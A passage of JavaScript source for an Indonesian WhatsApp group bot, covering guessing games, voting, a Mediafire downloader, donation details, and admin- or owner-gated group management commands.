if (this.suit[id]) haikal.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================//
case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5b6cf06c6c5dc1cc62e43.jpg' }, caption: `*Hai Kak ${m.pushName}*\n\n Bot Rental Prices\n⭔ 13k Per Group via E-Walet 1 Month\n⭔ 18k via pulsa 1 Month\n\n Premium Price Bot\n⭔ 8k per User 1 bulan\n\nPayment can be via Paypal/link aja/pulsa\n\nFor more details, you can chat with the owner\nhttps://wa.me/6283844775996 (Owner)\n\nDonate For Me : \n\n⭔ Paypal : https://trakteer.id/hw-mods-wa-haikal\n⭔ Saweria : https://saweria.co/hwmodswa` }, { quoted: hw })
}
break
//=================================================//
case 'sc': {
bangkal('My Chenell : https://youtube.com/c/YosokaNesia')
}
break
//=================================================//
case 'chat': {
if (!isCreator) return
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
haikal.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'unmute') {
haikal.chatModify({ mute: null }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'archive') {
haikal.chatModify({  archive: true }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'unarchive') {
haikal.chatModify({ archive: false }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'read') {
haikal.chatModify({ markRead: true }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'unread') {
haikal.chatModify({ markRead: false }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'delete') {
haikal.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
}
break
//=================================================//
case 'family100': {
if ('family100'+m.chat in _family100) {
bangkal('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await haikal.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
//=================================================//
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (!m.quoted && !text) throw `Kirim/bangkal text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
bangkal(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
//=================================================//
case 'tebak': {
if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await haikal.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: hw })
haikal.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, haikal.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
}
}
}
break
//=================================================//
case 'mediafire': {
////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return bangkal(mess.endLimit) 
if (!text) throw '*Enter a Link Query!*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*The link you provided is not valid*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return bangkal('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait zimbot processing..._

*ꪶ𝒀𝑶𝑺𝑶𝑲𝑨 ✇ 𝑴𝑶𝑫𝑺🜏ꫂ*`
bangkal(`${result4}`)
haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : hw }).catch ((err) => bangkal('*Failed to download File*'))
}
break
//=================================================//
case 'kuismath': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./src/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
haikal.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
bangkal("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break
//=================================================//
case 'jodohku': {
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah
@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: ments})
}
break
//=================================================//
case 'jadian': {
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, jawab, haikal.user.name, m, {mentions: menst})
}
break
//=================================================//
case 'react': {
if (!isCreator) return
reactionMessage = {
react: {
text: args[0],
key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
}
}
haikal.sendMessage(m.chat, reactionMessage)
}
break
//=================================================//  
case 'join': {
if (!isCreator) return
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'leave': {
if (!isCreator) return
await haikal.groupLeave(m.chat).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'setexif': {
if (!isCreator) return
   if (!isCreator) return
   if (!text) throw `Example : ${prefix + command} packname|author`
  global.packname = text.split("|")[0]
  global.author = text.split("|")[1]
  bangkal(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
}
break
//=================================================//
case 'kick': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'add': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'promote': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'demote': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'block': {
if (!isCreator) return
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => bangkal(mess.success)).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
  case 'setdesc': case 'setdesk': {
  if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => bangkal(mess.success)).catch((err) => bangkal(jsonformat(err)))
}
break
//=================================================//
  case 'setppbot': {
if (!isCreator) return
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
await haikal.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
bangkal(mess.success)
}
break
//=================================================//
   case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
await haikal.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
bangkal(mess.success)
}
break
//=================================================//
case 'tagall': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: hw })
}
break
//=================================================//
case 'hidetag': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: hw })
}
break
//=================================================//
case 'style': case 'styletext': {
if (!isPremium && global.db.data.users[m.sender].limit < 1) return bangkal(mess.endLimit) // respon ketika limit habis
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
bangkal(teks)
}
break
//=================================================//
   case 'vote': {
   if (!isCreator) return
if (!m.isGroup) throw mess.group
if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
bangkal(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
vote[m.chat] = [q, [], []]
await sleep(1000)
upvote = vote[m.chat][1]
devote = vote[m.chat][2]
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageVote = {
text: teks_vote,
footer: haikal.user.name,
buttons: buttonsVote,
headerType: 1
}
haikal.sendMessage(m.chat, buttonMessageVote)
}
break
//=================================================//
   case 'upvote': {
   if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][1].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsUpvote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageUpvote = {
text: teks_vote,
footer: haikal.user.name,
buttons: buttonsUpvote,
headerType: 1,
mentions: menvote
 }
haikal.sendMessage(m.chat, buttonMessageUpvote)
}
 break
//=================================================//
case 'devote': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
isVote = vote[m.chat][1].concat(vote[m.chat][2])
wasVote = isVote.includes(m.sender)
if (wasVote) throw 'Kamu Sudah Vote'
vote[m.chat][2].push(m.sender)
menvote = vote[m.chat][1].concat(vote[m.chat][2])
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote`
let buttonsDevote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]
let buttonMessageDevote = {
text: teks_vote,
footer: haikal.user.name,
buttons: buttonsDevote,
headerType: 1,
mentions: menvote
}
haikal.sendMessage(m.chat, buttonMessageDevote)
}
break
//=================================================// 
case 'cekvote':
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*
*Alasan:* ${vote[m.chat][0]}
┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────
*${prefix}hapusvote* - untuk menghapus vote
©${haikal.user.id}`
haikal.sendTextWithMentions(m.chat, teks_vote, m)
break
case 'deletevote': case'delvote': case 'hapusvote': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
delete vote[m.chat]
bangkal('Berhasil Menghapus Sesi Vote Di Grup Ini')
}
break
//=================================================//
   case 'group': case 'grup': {
   if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => bangkal(`Sukses Menutup Group`)).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => bangkal(`Sukses Membuka Group`)).catch((err) => bangkal(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mode Group`, haikal.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
 if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => bangkal(`Sukses Membuka Edit Info Group`)).catch((err) => bangkal(jsonformat(err)))
 } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => bangkal(`Sukses Menutup Edit Info Group`)).catch((err) => bangkal(jsonformat(err)))
 } else {
 let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mode Edit Info`, haikal.user.name, m)
}
}
break
//=================================================//
case 'antilink': {
if (!isCreator) return
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return bangkal(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = true
bangkal(`Antilink Aktif !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return bangkal(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].antilink = false
bangkal(`Antilink Tidak Aktif !`)
} else {
 let buttons = [
{ buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mode Antilink`, haikal.user.name, m)
}
 }
 break
//=================================================//
 case 'mute': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (args[0] === "on") {
if (db.data.chats[m.chat].mute) return bangkal(`Sudah Aktif Sebelumnya`)
db.data.chats[m.chat].mute = true
bangkal(`${haikal.user.name} telah di mute di group ini !`)
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].mute) return bangkal(`Sudah Tidak Aktif Sebelumnya`)
db.data.chats[m.chat].mute = false
bangkal(`${haikal.user.name} telah di unmute di group ini !`)
} else {
 let buttons = [
{ buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
]
await haikal.sendButtonText(m.chat, buttons, `Mute Bot`, haikal.user.name, m)
}
 }
 break
//=================================================//
case 'linkgroup': case 'linkgc': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'ephemeral': {
if (!m.isGroup) throw mess.group
if (!isBotAdmins) throw mess.botAdmin
if (!isAdmins) throw mess.admin
if (!text) throw 'Masukkan value enable/disable'
if (args[0] === 'enable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
} else if (args[0] === 'disable') {
await haikal.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => bangkal(jsonformat(res))).catch((err) => bangkal(jsonformat(err)))
}
}
break
//=================================================//
case 'delete': case 'del': {
if (!isCreator) return
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
//=================================================//
case 'infochat': {
if (!isCreator) return
if (!m.quoted) bangkal('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(m.chat, teks, m)
}
break
//=================================================//
case 'q': case 'quoted': {
if (!isCreator) return
if (!m.quoted) return bangkal('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return bangkal('Pesan Yang anda bangkal tidak mengandung bangkal')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
